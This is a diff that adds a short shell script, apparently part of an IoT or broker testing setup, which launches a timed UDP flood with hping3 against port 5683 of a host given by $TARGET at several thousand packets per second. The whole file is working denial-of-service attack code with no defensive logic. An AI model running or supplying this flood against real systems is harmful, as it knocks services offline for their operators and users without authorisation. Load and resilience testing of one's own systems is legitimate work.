@@ -1,0 +1,6 @@
+#!/bin/sh
+# UDP flood against the broker. Usage: udp_flood [seconds] [microseconds between packets]
+SECS=${1:-10}; GAP=${2:-120}
+echo "UDP flood -> $TARGET:5683 for ${SECS}s (gap ${GAP}us, ~5000+ packets/s)"
+timeout "$SECS" hping3 --udp -p 5683 -d 8 -i u"$GAP" "$TARGET" >/dev/null 2>&1
+echo "done"
